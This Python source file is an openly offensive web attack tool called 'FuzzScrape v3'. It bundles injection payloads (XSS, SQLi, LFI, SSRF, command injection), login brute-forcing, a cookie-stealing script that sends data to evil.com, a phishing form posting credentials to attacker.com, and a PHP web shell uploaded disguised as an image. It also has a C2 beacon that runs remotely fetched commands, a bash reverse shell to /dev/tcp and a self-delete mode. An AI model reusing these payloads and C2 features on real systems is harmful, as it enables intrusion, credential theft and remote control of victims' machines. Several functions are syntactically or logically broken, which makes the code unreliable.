import os, re, sys, time, json, random, asyncio, aiohttp, base64, urllib.parse, codecs, requests
from bs4 import BeautifulSoup
from colorama import Fore, Style, init
from asyncio_throttle import Throttler
import ast
import socket
import subprocess
from urllib.parse import urlparse
from cryptography.fernet import Fernet
import pyfiglet
from halo import Halo
import platform

init(autoreset=True)

if "android" in platform.platform().lower():
    print(Fore.YELLOW + "[!] Detected Android/Termux environment")

OUTPUT_DIR = 'output'
os.makedirs(OUTPUT_DIR, exist_ok=True)

USER_AGENTS = [
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64)",
    "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7)",
    "Mozilla/5.0 (X11; Linux x86_64)",
    "Mozilla/5.0 (Android 11; Mobile; rv:89.0) Gecko/89.0 Firefox/89.0"
]

referer_list = [
    "https://www.google.com",
    "https://www.bing.com",
    "https://www.duckduckgo.com"
]

HEADERS = lambda: {
    'User-Agent': random.choice(USER_AGENTS),
    'x-Requested-With': 'XMLHttpRequest',
    'X-Forwarded-For': f"127.0.0.{random.randint(1,254)}",
    'Referer': random.choice(referer_list),
    'DNT': '1',
    'Accept-Language': 'en-US,en;q=0.9',
    'Sec-Fetch-Dest': 'document'
}

throttler = Throttler(rate_limit=5)
timeout = aiohttp.ClientTimeout(total=15)
session = {
    "target": "",
    "creds": {},
    "cookies": {},
    "key": None
}

help_dict = {
    "xss": "Scan & fuzz reflected/DOM XSS",
    "brute": "Bruteforce login form",
    "upload": "Upload shell and trigger",
    "recon": "Gather info and discover endpoints",
    "admin": "Find admin panels",
    "shell": "Inject beacon and control",
    "beacon": "Beacon loop for C2",
    "chain": "Chain multiple modes",
    "dork": "Google dorking for targets",
    "manual": "Interactive CLI mode",
    "listen": "Listen for remote commands",
    "self-destruct": "Delete self after run",
    "update": "Check for updates",
    "sqli": "SQL Injection testing",
    "lfi": "Local File Inclusion testing",
    "rce": "Remote Command Execution testing",
    "ssti": "Server Side Template Injection testing",
    "xxe": "XML External Entity testing"
}

def banner():
    print(pyfiglet.figlet_format("FuzzScrape v3"))
    spinner = Halo(text='Launching', spinner='dots')
    spinner.start()
    asyncio.run(main())
    spinner.succeed("Ready")

def is_valid_url(url):
    parsed = urlparse(url)
    return bool(parsed.scheme) and bool(parsed.netloc)

def save_output(mode, data):
    with open(f"output/{mode}.txt", "a") as f:
        f.write(data + "\n")

def encrypt_data(data):
    key = Fernet.generate_key()
    f = Fernet(key)
    encrypted = f.encrypt(data.encode())
    session["key"] = key
    return encrypted, key

def decrypt_data(token, key):
    try:
        f = Fernet(key)
        decrypted = f.decrypt(token.encode()).decode()
        return decrypted
    except Exception as e:
        print(f"[!] Failed to decrypt: {e}")
        return None

def html_encode(payload):
    return ''.join(['&#%d;' % ord(c) for c in payload])

def php_rot13(payload):
    return "eval(str_rot13('" + codecs.encode(payload, 'rot_13') + "'));"

async def fetch(session, url, method='GET', **kwargs):
    async with throttler:
        try:
            async with client.request(method, url, headers=HEADERS(), **kwargs) as r:
                return await r.text(), r.status, dict(r.headers)
        except aiohttp.ClientError as e:
            print(Fore.YELLOW + f"[!] Request Error: {e}")
            return str(e), 0, {}

def mutate_payload(payload):
    mutations = [
        payload,
        payload.replace('<', '&#60;').replace('>', '&#62;'),
        payload.replace('alert', 'eval(String.fromCharCode(97,108,101,114,116))'),
        payload.replace('alert', 'Function("al"+ "ert")()'),
        payload.replace('<script>', '<scr\0ipt>').replace('</script>', '</scr\0ipt>'),
        payload.replace('=', '＝')
    ]
    return random.choice(mutations)

async def stealth_inject(session, url, payload, delay=2, headers=None):
    if headers is None:
        headers = HEADERS()
    headers.update({
        'Referer': url,
        'X-Forwarded-For': f"10.0.{random.randint(0,255)}.{random.randint(1,254)}"
    })
    await asyncio.sleep(delay)
    html, _, _ = await fetch(session, f"{url}?search={urllib.parse.quote_plus(payload)}", headers=headers)
    return html

async def xss_fuzz(session, url):
    print(Fore.CYAN + f"[XSS] Target: {url}")
    payloads = ['<script>alert(1)</script>', '" onerror=alert(1) ', "'><svg/onload=alert(1)>"]
    for p in payloads:
        mutated_payload = mutate_payload(p)
        html = await stealth_inject(session, url, mutated_payload)
        if mutated_payload in html:
            print(Fore.RED + f"[!] XSS Found: {url} with payload: {mutated_payload}")
            save_output('xss', f"{url} with payload: {mutated_payload}")
            log("xss", f"{url} with payload: {mutated_payload}")

async def scrape_links(session, url):
    print(Fore.CYAN + f"[SCRAPE] {url}")
    html, _, _ = await fetch(session, url)
    soup = BeautifulSoup(html, 'html.parser')
    links = {urllib.parse.urljoin(url, a['href']) for a in soup.find_all('a', href=True)}
    for l in sorted(links):
        print(Fore.GREEN + l)
        save_output('scraped_links', l)
    print(Fore.YELLOW + f"[*] Total Links Found: {len(links)}")

async def dom_xss_check(session, url):
    html, _, _ = await fetch(session, url)
    patterns = [r"<script>.*?alert$1$.*?</script>", r"onerror\s*=\s*alert"]
    if any(re.search(pat, html, re.I) for pat in patterns):
        print(Fore.RED + f"[!] Potential DOM XSS Found: {url}")
        save_output("dom_xss", url)

async def lfi_check(session, url):
    paths = ["../../etc/passwd", "../../../boot.ini", "../config.php"]
    for path in paths:
        test_url = f"{url}?file={urllib.parse.quote_plus(path)}"
        html, _, _ = await fetch(session, test_url)
        if "root:" in html or "boot loader" in html:
            print(Fore.RED + f"[!] LFI Detected: {test_url}")
            save_output('lfi', test_url)

async def admin_panel_fuzz(session, url):
    print(Fore.CYAN + f"[ADMIN PANEL] Target: {url}")
    admin_paths = ['/admin', '/login', '/wp-admin', '/administrator', '/dashboard', '/admin.php', '/adm/', '/manager/', '/controlpanel/', '/user/', '/users/', '/account/', '/cp/', '/ucp/', '/panel/', '/wp-login.php']
    for path in admin_paths:
        test_url = urllib.parse.urljoin(url, path)
        html, status, _ = await fetch(session, test_url)
        if status == 200 and any(keyword in html.lower() for keyword in ["login", "admin", "dashboard", "control panel", "user", "account"]):
            print(Fore.RED + f"[!] Potential Admin Panel Found: {test_url}")
            save_output('admin_panels', test_url)
            session["admin_panel"] = test_url
            return {"admin": test_url}

async def phishing_attack(session, url):
    print(Fore.CYAN + f"[PHISHING] Target: {url}")
    phishing_payload = "<form action='http://attacker.com/collect' method='post'><input type='text' name='username'><input type='password' name='password'><input type='submit'></form>"
    test_url = f"{url}/phishing"
    html, status, _ = await fetch(session, test_url, method='POST', data={'html': phishing_payload})
    if status == 200:
        print(Fore.RED + f"[!] Phishing Page Deployed: {test_url}")
        save_output('phishing', test_url)

async def mitm_attack(session, url):
    print(Fore.CYAN + f"[MITM] Target: {url}")
    mitm_payload = "Your MITM payload here"
    test_url = f"{url}/mitm"
    html, status, _ = await fetch(session, test_url, method='POST', data={'payload': mitm_payload})
    if status == 200:
        print(Fore.RED + f"[!] MITM Attack Successful: {test_url}")
        save_output('mitm', test_url)

async def port_scan(session, url, ports):
    print(Fore.CYAN + f"[PORT SCAN] Target: {url}")
    scheme = url.split("://")[0]
    host = url.replace(scheme + "://", "")
    for port in ports:
        test_url = f"{scheme}://{host}:{port}"
        try:
            async with client.get(test_url, timeout=5) as response:
                if response.status == 200:
                    print(Fore.RED + f"[!] Open Port Found: {test_url}")
                    save_output('open_ports', test_url)
        except (aiohttp.ClientError, asyncio.TimeoutError):
            continue

async def gather_info(session, url):
    print(Fore.CYAN + f"[GATHER INFO] Target: {url}")
    html, _, _ = await fetch(session, url)
    soup = BeautifulSoup(html, 'html.parser')
    title = soup.title.string if soup.title else "No Title"
    meta_tags = soup.find_all('meta')
    description = ""
    keywords = ""
    for tag in meta_tags:
        if tag.get('name') == 'description':
            description = tag.get('content', '')
        elif tag.get('name') == 'keywords':
            keywords = tag.get('content', '')
    print(Fore.YELLOW + f"[*] Title: {title}")
    print(Fore.YELLOW + f"[*] Description: {description}")
    print(Fore.YELLOW + f"[*] Keywords: {keywords}")
    save_output('gathered_info', f"URL: {url}\nTitle: {title}\nDescription: {description}\nKeywords: {keywords}\n")

async def sqli_fuzz(session, url):
    print(Fore.CYAN + f"[SQLi] Target: {url}")
    payloads = ["' OR '1'='1", "' OR '1'='1' --", "' OR '1'='1' #", "' OR '1'='1'/*", "admin' --", "admin' #", "admin'/*"]
    for p in payloads:
        test_url = f"{url}?id={urllib.parse.quote_plus(p)}"
        html, status, _ = await fetch(session, test_url)
        if "sql syntax" in html.lower() or "mysql_error" in html.lower() or "postgres_error" in html.lower():
            print(Fore.RED + f"[!] SQLi Detected: {test_url}")
            save_output('sqli', test_url)

async def open_redirect(session, url):
    print(Fore.CYAN + f"[OPEN REDIRECT] Target: {url}")
    payloads = ["?next=http://evil.com", "?return=http://evil.com", "?url=http://evil.com"]
    for p in payloads:
        test_url = f"{url}{p}"
        html, status, headers = await fetch(session, test_url)
        if "location" in headers and "evil.com" in headers["location"]:
            print(Fore.RED + f"[!] Open Redirect Detected: {test_url}")
            save_output('open_redirect', test_url)

async def host_header_injection(session, url):
    print(Fore.CYAN + f"[HOST HEADER INJECTION] Target: {url}")
    payloads = ["localhost", "127.0.0.1", "internal-server"]
    for p in payloads:
        headers = HEADERS()
        headers["Host"] = p
        html, status, _ = await fetch(session, url, headers=headers)
        if "internal" in html.lower() or "localhost" in html.lower():
            print(Fore.RED + f"[!] Host Header Injection Detected: {url} with Host: {p}")
            save_output('host_header_injection', f"{url} with Host: {p}")

async def jsonp_exploit(session, url):
    print(Fore.CYAN + f"[JSONP] Target: {url}")
    payloads = ["?callback=evil", "?jsonp=evil"]
    for p in payloads:
        test_url = f"{url}{p}"
        html, status, _ = await fetch(session, test_url)
        if "evil(" in html:
            print(Fore.RED + f"[!] JSONP Exploit Detected: {test_url}")
            save_output('jsonp', test_url)

async def command_injection(session, url):
    print(Fore.CYAN + f"[COMMAND INJECTION] Target: {url}")
    payloads = ["; ping -c 1 evil.com", "; echo evil"]
    for p in payloads:
        test_url = f"{url}?cmd={urllib.parse.quote_plus(p)}"
        html, status, _ = await fetch(session, test_url)
        if "evil" in html:
            print(Fore.RED + f"[!] Command Injection Detected: {test_url}")
            save_output('command_injection', test_url)

async def subdomain_scanner(session, url, subdomains):
    print(Fore.CYAN + f"[SUBDOMAIN SCANNER] Target: {url}")
    for subdomain in subdomains:
        test_url = f"http://{subdomain}.{url}"
        try:
            async with client.get(test_url, timeout=5) as response:
                if response.status == 200:
                    print(Fore.RED + f"[!] Subdomain Found: {test_url}")
                    save_output('subdomains', test_url)
        except (aiohttp.ClientError, asyncio.TimeoutError):
            continue

async def webshell_uploader(session, url, shell_path):
    print(Fore.CYAN + f"[WEBSHELL UPLOADER] Target: {url}")
    if not os.path.isfile(shell_path):
        print(Fore.RED + f"[!] File not found: {shell_path}")
        return
    with open(shell_path, 'r') as f:
        shell_content = f.read()
    form = aiohttp.FormData()
    form.add_field('file', shell_content, filename='image.png', content_type='image/png')
    test_url = f"{url}/upload"
    html, status, _ = await fetch(session, test_url, method='POST', data=form)
    if status == 200 and "upload successful" in html.lower():
        print(Fore.RED + f"[!] Webshell Uploaded: {test_url}")
        save_output('webshell', test_url)
        session["shell_uploaded"] = test_url

async def admin_login_bruteforce(session, url, credentials):
    print(Fore.CYAN + f"[ADMIN LOGIN BRUTEFORCE] Target: {url}")
    for cred in credentials:
        data = {'username': cred[0], 'password': cred[1]}
        html, status, _ = await fetch(session, url, method='POST', data=data)
        if "dashboard" in html.lower() or "admin panel" in html.lower():
            print(Fore.RED + f"[!] Admin Login Successful: {cred[0]}:{cred[1]}")
            save_output('admin_login', f"{cred[0]}:{cred[1]}")
            session["brute_success"] = True
            return {"brute_success": True}

async def js_file_parser(session, url):
    print(Fore.CYAN + f"[JS FILE PARSE] Target: {url}")
    html, _, _ = await fetch(session, url)
    soup = BeautifulSoup(html, 'html.parser')
    js_files = [urllib.parse.urljoin(url, script['src']) for script in soup.find_all('script', src=True)]
    for js_file in js_files:
        js_content, _, _ = await fetch(session, js_file)
        if "api_key" in js_content or "secret" in js_content:
        print(Fore.RED + f"[!] Sensitive Info Found in JS: {js_file}")
        save_output('js_parsers', js_file)
            save_output('js_parsers', js_file)

async def advanced_sqli_fuzz(session, url):
    print(Fore.CYAN + f"[ADVANCED SQLi] Target: {url}")
    payloads = ["' OR SLEEP(5) --", "' UNION SELECT NULL, version()--", "' AND '1'='1"]
    for p in payloads:
        test_url = f"{url}?id={urllib.parse.quote_plus(p)}"
        start_time = time.time()
        html, status, _ = await fetch(session, test_url)
        end_time = time.time()
        if end_time - start_time > 5 or "mysql" in html.lower() or "postgres" in html.lower():
            print(Fore.RED + f"[!] Advanced SQLi Detected: {test_url}")
            save_output('advanced_sqli', test_url)

async def rce_via_file_upload(session, url):
    print(Fore.CYAN + f"[RCE VIA FILE UPLOAD] Target: {url}")
    shell_content = '<?php system($_GET["cmd"]); ?>'
    form = aiohttp.FormData()
    form.add_field('file', shell_content, filename='shell.php', content_type='image/jpeg')
    test_url = f"{url}/upload"
    html, status, _ = await fetch(session, test_url, method='POST', data=form)
    if status == 200:
        print(Fore.RED + f"[!] File Uploaded: {test_url}")
        save_output('rce_upload', test_url)

async def cors_misconfig_exploit(session, url):
    print(Fore.CYAN + f"[CORS MISCONFIG] Target: {url}")
    headers = HEADERS()
    headers["Origin"] = "https://evil.com"
    html, status, response_headers = await fetch(session, url, headers=headers)
    if "Access-Control-Allow-Origin" in response_headers and response_headers["Access-Control-Allow-Origin"] == "*":
        print(Fore.RED + f"[!] CORS Misconfiguration Detected: {url}")
        save_output('cors_misconfig', url)

async def dom_xss_launcher(session, url):
    print(Fore.CYAN + f"[DOM XSS LAUNCHER] Target: {url}")
    payload = "<script>window.location='//evil.com?c='+document.cookie</script>"
    test_url = f"{url}?q={urllib.parse.quote_plus(payload)}"
    html, status, _ = await fetch(session, test_url)
    if payload in html:
        print(Fore.RED + f"[!] DOM XSS Launched: {test_url}")
        save_output('dom_xss_launcher', test_url)

async def ssrf_exploit(session, url):
    print(Fore.CYAN + f"[SSRF] Target: {url}")
    payloads = ["http://127.0.0.1:80", "http://169.254.169.254/latest/meta-data/"]
    for p in payloads:
        test_url = f"{url}?url={urllib.parse.quote_plus(p)}"
        html, status, _ = await fetch(session, test_url)
        if "instance-id" in html or "127.0.0.1" in html:
            print(Fore.RED + f"[!] SSRF Detected: {test_url}")
            save_output('ssrf', test_url)

async def http_smuggling_detect(session, url):
    print(Fore.CYAN + f"[HTTP SMUGGLING] Target: {url}")
    smuggling_payload = (
        "POST / HTTP/1.1\r\n"
        "Host: target.com\r\n"
        "Transfer-Encoding: chunked\r\n"
        "Content-Length: 4\r\n\r\n"
        "0\r\n"
        "GET /admin HTTP/1.1\r\n"
        "Host: target.com\r\n\r\n"
    )
    headers = HEADERS()
    headers["Content-Type"] = "application/x-www-form-urlencoded"
    html, status, _ = await fetch(session, url, method='POST', headers=headers, data=smuggling_payload)
    if status == 200 and "admin" in html:
        print(Fore.RED + f"[!] HTTP Smuggling Detected: {url}")
        save_output('http_smuggling', url)

async def js_endpoint_discovery(session, url):
    print(Fore.CYAN + f"[JS ENDPOINT DISCOVERY] Target: {url}")
    html, _, _ = await fetch(session, url)
    soup = BeautifulSoup(html, 'html.parser')
    js_files = [script['src'] for script in soup.find_all('script', src=True)]
    endpoints = set()
    for js_file in js_files:
        js_content, _, _ = await fetch(session, js_file)
        endpoints.update(re.findall(r'fetch$["\'](.*?)["\']$', js_content))
    for endpoint in endpoints:
        print(Fore.GREEN + f"[*] Discovered Endpoint: {endpoint}")
        save_output('js_endpoints', endpoint)

async def wayback_machine_mining(session, url):
    print(Fore.CYAN + f"[WAYBACK MACHINE] Target: {url}")
    try:
        from waybackpy import WaybackMachine
        wayback = WaybackMachine()
        urls = wayback.urls(url, limit=10)
        for entry in urls:
            print(Fore.GREEN + f"[*] Archived URL: {entry['url']}")
            save_output('wayback_urls', entry['url'])
    except Exception as e:
        print(Fore.YELLOW + f"[!] WaybackMachine error: {e}")
        print(Fore.YELLOW + "[!] 'waybackpy' module not found.")

async def csp_headers_analysis(session, url):
    print(Fore.CYAN + f"[CSP & HEADERS ANALYSIS] Target: {url}")
    html, _, headers = await fetch(session, url)
    csp = headers.get('Content-Security-Policy', 'No CSP Found')
    x_frame_options = headers.get('X-Frame-Options', 'No X-Frame-Options Found')
    access_control_allow_origin = headers.get('Access-Control-Allow-Origin', 'No Access-Control-Allow-Origin Found')
    print(Fore.YELLOW + f"[*] Content-Security-Policy: {csp}")
    print(Fore.YELLOW + f"[*] X-Frame-Options: {x_frame_options}")
    print(Fore.YELLOW + f"[*] Access-Control-Allow-Origin: {access_control_allow_origin}")
    save_output('csp_headers', f"URL: {url}\nCSP: {csp}\nX-Frame-Options: {x_frame_options}\nAccess-Control-Allow-Origin: {access_control_allow_origin}\n")

async def open_directory_scanner(session, url):
    print(Fore.CYAN + f"[OPEN DIRECTORY SCANNER] Target: {url}")
    directories = ['/uploads/', '/backups/', '/config/']
    for directory in directories:
        test_url = urllib.parse.urljoin(url, directory)
        html, status, _ = await fetch(session, test_url)
        if "Index of" in html or "Directory listing" in html:
            print(Fore.RED + f"[!] Open Directory Found: {test_url}")
            save_output('open_directories', test_url)

async def beacon_loop(session, c2_url, interval=10):
    while True:
        html, _, _ = await fetch(session, f"{c2_url}/commands")
        if "exec:" in html:
            command = html.split("exec:")[1].strip()
            os.system(command)
        await asyncio.sleep(interval)

async def path_discovery(session, url):
    keywords = ['admin', 'conf', 'config', 'debug', 'logs', 'users', 'system']
    for word in keywords:
        path = f"{url}/{word}/"
        html, status, _ = await fetch(session, path)
        if "Index of" in html:
            save_output('path_discovery', path)

async def remote_task_exec(session, c2_url, target_url):
    tasks, _, _ = await fetch(session, f"{c2_url}/task.json")
    try:
        cmds = json.loads(tasks)
        for cmd in cmds:
            if cmd['type'] == 'xss':
                await xss_fuzz(session, target_url)
            elif cmd['type'] == 'brute':
                await admin_login_bruteforce(session, target_url, cmd['creds'])
    except Exception as e:
        print(f"[!] Task Error: {e}")

async def rev_shell(ip, port):
    bash = f"bash -i >& /dev/tcp/{ip}/{port} 0>&1"
    encoded_bash = base64.b64encode(bash.encode()).decode()
    print("Payload:", encoded_bash)

async def run_chain(sequence, session):
    for step in sequence.split(","):
        if step in help_dict:
            await globals()[step](session, session["target"])

async def run_target(session, url, mode, ports=None, subdomains=None, shell_path=None, credentials=None, c2_url=None, interval=None, delay=None, headers=None, payload=None, encode=None, obfuscate=None, ip=None, port=None, listen=False, webhook=None, unlock=None, silent=False, json_output=False, chain_report=False):
    if not url.startswith(('http://', 'https://')):
        print(Fore.RED + f"[!] Invalid URL format: {url}")
        return
    if mode == "xss":
        await xss_fuzz(session, url)
    elif mode == "scrape":
        await scrape_links(session, url)
    elif mode == "domxss":
        await dom_xss_check(session, url)
    elif mode == "lfi":
        await lfi_check(session, url)
    elif mode == "admin":
        result = await admin_panel_fuzz(session, url)
        if result and result.get("admin"):
            session["admin_panel"] = result["admin"]
    elif mode == "phish":
        await phishing_attack(session, url)
    elif mode == "mitm":
        await mitm_attack(session, url)
    elif mode == "scan":
        await port_scan(session, url, ports)
    elif mode == "info":
        await gather_info(session, url)
    elif mode == "sqli":
        await sqli_fuzz(session, url)
    elif mode == "redirect":
        await open_redirect(session, url)
    elif mode == "host":
        await host_header_injection(session, url)
    elif mode == "jsonp":
        await jsonp_exploit(session, url)
    elif mode == "cmd":
        await command_injection(session, url)
    elif mode == "subdomain":
        await subdomain_scanner(session, url, subdomains)
    elif mode == "webshell":
        await webshell_uploader(session, url, shell_path)
    elif mode == "brute":
        result = await admin_login_bruteforce(session, url, credentials)
        if result and result.get("brute_success"):
            session["brute_success"] = True
    elif mode == "jsparse":
        await js_file_parser(session, url)
    elif mode == "adv_sqli":
        await advanced_sqli_fuzz(session, url)
    elif mode == "rce_upload":
        await rce_via_file_upload(session, url)
    elif mode == "cors":
        await cors_misconfig_exploit(session, url)
    elif mode == "dom_xss_launch":
        await dom_xss_launcher(session, url)
    elif mode == "ssrf":
        await ssrf_exploit(session, url)
    elif mode == "smuggling":
        await http_smuggling_detect(session, url)
    elif mode == "js_endpoints":
        await js_endpoint_discovery(session, url)
    elif mode == "wayback":
        await wayback_machine_mining(session, url)
    elif mode == "csp":
        await csp_headers_analysis(session, url)
    elif mode == "open_dir":
        await open_directory_scanner(session, url)
    elif mode == "beacon":
        asyncio.create_task(beacon_loop(session, c2_url, interval))
    elif mode == "path_discovery":
        await path_discovery(session, url)
    elif mode == "remote_task":
        await remote_task_exec(session, c2_url, url)
    elif mode == "rev_shell":
        asyncio.create_task(rev_shell(ip, port))
    elif mode == "chain":
        await run_chain(sequence=mode, session=session)
    elif mode == "dork":
        # Implement Google dorking here
        pass
    elif mode == "manual":
        while True:
            print("\n[1] XSS\n[2] Brute\n[3] Upload\n[4] Chain\n[Q] Quit")
            ch = input(">> ").strip().lower()
            if ch == 'q': break
            elif ch == '4':
                sequence = input("Enter chain sequence (e.g., recon,admin,brute,upload,shell,beacon): ").strip()
                await run_chain(sequence, session)
            else:
                await run_target(session, url, ch)
    elif mode == "listen":
        if listen:
            # Implement listening for remote commands here
            pass
    elif mode == "self-destruct":
        if unlock == os.environ.get("FZ_KEY"):
            await run_target(session, url, "chain", sequence="recon,admin,brute,upload,shell,beacon")
            os.remove(__file__)
        else:
            print(Fore.RED + "[!] Access denied. Incorrect key.")
    elif mode == "update":
        check_update()
    else:
        print(Fore.YELLOW + "[!] Unknown mode")

async def menu_mode():
    banner()
    while True:
        print(Fore.CYAN + "\n=== SELECT MODE ===")
        for key, value in help_dict.items():
            print(f"[{key}] {value}")
        print("[Q] Quit")
        try:
            choice = input("Choose mode: ").strip().lower()
            if choice == "q":
                print("Exiting...")
                return
            url = input("Enter target URL (http/https): ").strip()
            async with aiohttp.ClientSession(timeout=timeout) as client:
                if choice == "scan":
                    ports = list(map(int, input("Enter ports to scan (comma separated): ").strip().split(",")))
                    mode = "scan"
                elif choice == "subdomain":
                    subdomains = input("Enter subdomains to scan (comma separated): ").strip().split(",")
                    mode = "subdomain"
                elif choice == "webshell":
                    shell_path = input("Enter path to the webshell: ").strip()
                    mode = "webshell"
                elif choice == "brute":
                    try:
                        credentials = ast.literal_eval(input("Enter credentials list (e.g., [('admin', 'password'), ('user', 'pass')]): ").strip())
                    except Exception as e:
                        print(Fore.RED + f"[!] Failed to parse credentials: {e}")
                        continue
                    mode = "brute"
                elif choice == "beacon":
                    c2_url = input("Enter C2 URL: ").strip()
                    interval = int(input("Enter beacon interval (seconds): ").strip())
                    mode = "beacon"
                elif choice == "remote_task":
                    c2_url = input("Enter C2 URL: ").strip()
                    mode = "remote_task"
                elif choice == "rev_shell":
                    ip = input("Enter IP: ").strip()
                    port = int(input("Enter Port: ").strip())
                    mode = "rev_shell"
                elif choice == "chain":
                    sequence = input("Enter chain sequence (e.g., recon,admin,brute,upload,shell,beacon): ").strip()
                    mode = "chain"
                elif choice == "dork":
                    # Implement Google dorking here
                    mode = "dork"
                elif choice == "manual":
                    mode = "manual"
                elif choice == "listen":
                    mode = "listen"
                elif choice == "self-destruct":
                    unlock = input("Enter unlock key: ").strip()
                    mode = "self-destruct"
                elif choice == "update":
                    mode = "update"
                else:
                    ports = None
                    subdomains = None
                    shell_path = None
                    credentials = None
                    c2_url = None
                    interval = None
                    ip = None
                    port = None
                    unlock = None
                    mode = choice
                if mode:
                    await run_target(session, url, mode, ports, subdomains, shell_path, credentials, c2_url, interval, delay, headers, payload, encode, obfuscate, ip, port, listen, webhook, unlock, silent, json_output, chain_report)
                else:
                    print("[!] Invalid choice.")
        except KeyboardInterrupt:
            print("\n[!] Interrupted by user.")
            return

def check_update():
    r = requests.get("https://raw.githubusercontent.com/your-username/your-repo-name/main/version.txt")
    local_version = "1.0.0"  # Replace with your local version
    if r.text.strip() != local_version:
        print("Update available. Pulling...")
        os.system("git pull")

def log(mode, text):
    with open(f"output/{mode}.txt", "a") as f:
        f.write(text + "\n")

async def main():
    import argparse
    parser = argparse.ArgumentParser()
    parser.add_argument("--mode", help="xss, scrape, domxss, lfi, admin, phish, mitm, scan, info, sqli, redirect, host, jsonp, cmd, subdomain, webshell, brute, jsparse, adv_sqli, rce_upload, cors, dom_xss_launch, ssrf, smuggling, js_endpoints, wayback, csp, open_dir, beacon, path_discovery, remote_task, rev_shell, chain, dork, manual, listen, self-destruct, update, sqli, lfi, rce, ssti, xxe")
    parser.add_argument("--url", help="Target URL")
    parser.add_argument("--ports", help="Comma separated ports for scan mode")
    parser.add_argument("--subdomains", help="Comma separated subdomains for subdomain scan mode")
    parser.add_argument("--shell", help="Path to the webshell for upload")
    parser.add_argument("--credentials", help="Credentials list for admin login brute force (e.g., [('admin', 'password'), ('user', 'pass')])")
    parser.add_argument("--c2", help="C2 URL for beacon or remote task")
    parser.add_argument("--interval", help="Beacon interval in seconds", type=int)
    parser.add_argument("--delay", help="Delay between requests in seconds", type=float)
    parser.add_argument("--headers", help="Custom headers for requests")
    parser.add_argument("--payload", help="Custom payload for injection")
    parser.add_argument("--encode", help="Encode payload (hex, base64, unicode, utf7)")
    parser.add_argument("--obfuscate", help="Obfuscate payload")
    parser.add_argument("--ip", help="IP address for reverse shell")
    parser.add_argument("--port", help="Port for reverse shell", type=int)
    parser.add_argument("--listen", action="store_true", help="Listen for remote commands")
    parser.add_argument("--webhook", help="Webhook URL for notifications")
    parser.add_argument("--unlock", help="Unlock key for self-destruct mode")
    parser.add_argument("--silent", action="store_true", help="Silent mode, no output to console")
    parser.add_argument("--json", action="store_true", help="Output results in JSON format")
    parser.add_argument("--chain-report", action="store_true", help="Print chain report")
    args = parser.parse_args()

    if args.mode and args.url:
        async with aiohttp.ClientSession(timeout=timeout) as client:
            session["target"] = args.url
            await run_target(session, args.url, args.mode, args.ports, args.subdomains, args.shell, args.credentials, args.c2, args.interval, args.delay, args.headers, args.payload, args.encode, args.obfuscate, args.ip, args.port, args.listen, args.webhook, args.unlock, args.silent, args.json, args.chain_report)
    else:
        await menu_mode()

if __name__ == "__main__":
    import sys
    if len(sys.argv) == 1:
        import asyncio
        asyncio.run(menu_mode())
        sys.exit()
    import sys
    
    asyncio.run(main())
   